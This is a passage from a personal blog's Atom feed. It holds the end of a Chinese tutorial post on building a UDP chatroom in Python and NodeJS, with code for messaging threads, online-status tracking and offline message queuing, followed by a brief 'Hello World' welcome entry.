class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">'服务器接收数据函数执行，线程名字 %s'</span> % threading.current_thread().name)</span><br><span class="line"></span><br><span class="line">data,addc=server.recvfrom(<span class="number">2048</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'client：'</span>, data.decode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">t = threading.Thread(target=receive_message, args=(server,))</span><br><span class="line"></span><br><span class="line">t.start()</span><br><span class="line"></span><br><span class="line">t.join()</span><br></pre></td></tr></table></figure><h3 id="客户端发送线程实现-def-send-message-client"><a href="#客户端发送线程实现-def-send-message-client" class="headerlink" title="客户端发送线程实现 def send_message(client)"></a>客户端发送线程实现 def send_message(client)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">'客户端发送数据函数执行，线程名字 %s'</span> % threading.current_thread().name)</span><br><span class="line"></span><br><span class="line">msg = input(<span class="string">'client: '</span>)</span><br><span class="line"></span><br><span class="line">client.sendto(msg.encode(<span class="string">'utf-8'</span>), address)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">t1 = threading.Thread(target=send_message, args=(client,))</span><br><span class="line"></span><br><span class="line">t1.start()</span><br><span class="line"></span><br><span class="line">t1.join()</span><br></pre></td></tr></table></figure><h2 id="NodeJS-最终版"><a href="#NodeJS-最终版" class="headerlink" title="NodeJS 最终版"></a>NodeJS 最终版</h2><h3 id="用户上线提醒"><a href="#用户上线提醒" class="headerlink" title="用户上线提醒"></a>用户上线提醒</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//默认连接后上线操作</span></span><br><span class="line">msg.udpSendMsg(client,<span class="function"><span class="keyword">function</span> (<span class="params">err, bytes</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(err == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"User1 上线!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="单对单私聊函数"><a href="#单对单私聊函数" class="headerlink" title="单对单私聊函数"></a>单对单私聊函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置只能发送给 User2</span></span><br><span class="line"></span><br><span class="line">msg.setTo(&#123;</span><br><span class="line">    name: <span class="string">'User2'</span></span><br><span class="line">    &#125;);  </span><br><span class="line"></span><br><span class="line">msg.udpSendMsg(client, <span class="function"><span class="keyword">function</span> (<span class="params">err, bytes</span>) </span>&#123;</span><br><span class="line">             <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                 <span class="comment">//发送失败</span></span><br><span class="line">                 &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h3 id="在线状态"><a href="#在线状态" class="headerlink" title="在线状态"></a>在线状态</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 加入某个用户的在线状态</span></span><br><span class="line"><span class="comment">* @param name</span></span><br><span class="line"><span class="comment">* @param rinfo  </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> pushIntoPool = <span class="function"><span class="keyword">function</span> (<span class="params">name, rinfo</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> index = userPool.online.indexOf(name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (index &gt;= <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">    userPool.online.splice(index, <span class="number">1</span>);</span><br><span class="line">    userPool.pool.splice(index, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">userPool.online.push(name);</span><br><span class="line"></span><br><span class="line">userPool.pool.push(&#123;</span><br><span class="line">    name: name,</span><br><span class="line">    ip: rinfo.address,</span><br><span class="line">    port: rinfo.port</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="离线消息"><a href="#离线消息" class="headerlink" title="离线消息"></a>离线消息</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 加入离线消息任务</span></span><br><span class="line"><span class="comment">* @param msg</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> addInTask = <span class="function"><span class="keyword">function</span> (<span class="params">msg</span>)</span>&#123;</span><br><span class="line">    msgTask.tasks.push(&#123;</span><br><span class="line">        msg: msg,</span><br><span class="line">        expireTime: <span class="number">7</span> *<span class="number">24</span> *<span class="number">600</span> + <span class="keyword">new</span> <span class="built_in">Date</span>().getTime()</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="后台轮询"><a href="#后台轮询" class="headerlink" title="后台轮询"></a>后台轮询</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 后台轮询任务</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> backgroundTask = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; msgTask.tasks.length; i++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> m = msgTask.tasks.splice(i,<span class="number">1</span>)[<span class="number">0</span>];</span><br><span class="line">        sendMsg(m.msg);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">beginTask(); &#125;;</span><br></pre></td></tr></table></figure><h1 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h1><p><img src="/images/Chatroom/1.png" alt="avatar"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>一个成功软件的编写在于不断改进和完善，nodeJS 不同于适用于前端开发的 JavaScript，NodeJs更适合服务器的后端开发，其回调函数的异步特性大大改善了计算机性能，虽然不能完全替代协程与线程，但却能替代其一部分功 能，确实是非常方便的</p><h1 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h1><p>该软件源代码已上传至<a href="https://github.com/yakumozoe/Chatroom" target="_blank" rel="noopener">GitHub的个人仓库</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Abstract&quot;&gt;&lt;a href=&quot;#Abstract&quot; class=&quot;headerlink&quot; title=&quot;Abstract&quot;&gt;&lt;/a&gt;Abstract&lt;/h1&gt;&lt;p&gt;A small chatroom based on User Datagram Protocol&lt;/p&gt;
    
    </summary>
    
      <category term="CS" scheme="http://zoec.info/categories/CS/"/>
    
    
      <category term="Python" scheme="http://zoec.info/tags/Python/"/>
    
      <category term="UDP" scheme="http://zoec.info/tags/UDP/"/>
    
      <category term="NodeJS" scheme="http://zoec.info/tags/NodeJS/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://zoec.info/2018/08/26/hello-world/"/>
    <id>http://zoec.info/2018/08/26/hello-world/</id>
    <published>2018-08-25T16:00:00.000Z</published>
    <updated>2018-09-01T12:56:01.875Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://zoec.info/about/"><em>Zoe C.</em></a>‘s <a href="https://zoec.info/"><em>Mistletoe</em></a></p><a id="more"></a><p>Check <a href="https://zoec.info/about/"><em>About</em></a> for more info.</p><p>If you get any technical problems about computer science, clinical medicine or biomedical engineering, you can contact me via email(<a href="mailto:yakumorainy@outlook.com" target="_blank" rel="noopener">yakumorainy@outlook.com</a>) or you can ask me on <a href="https://github.com/yakumozoe" target="_blank" rel="noopener"><em>GitHub</em></a>.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://zoec.info/about/&quot;&gt;&lt;em&gt;Zoe C.&lt;/em&gt;&lt;/a&gt;‘s &lt;a href=&quot;https://zoec.info/&quot;&gt;&lt;em&gt;Mistletoe&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="test" scheme="http://zoec.info/categories/test/"/>
    
    
      <category term="test" scheme="http://zoec.info/tags/test/"/>
    
  </entry>
  
</feed>
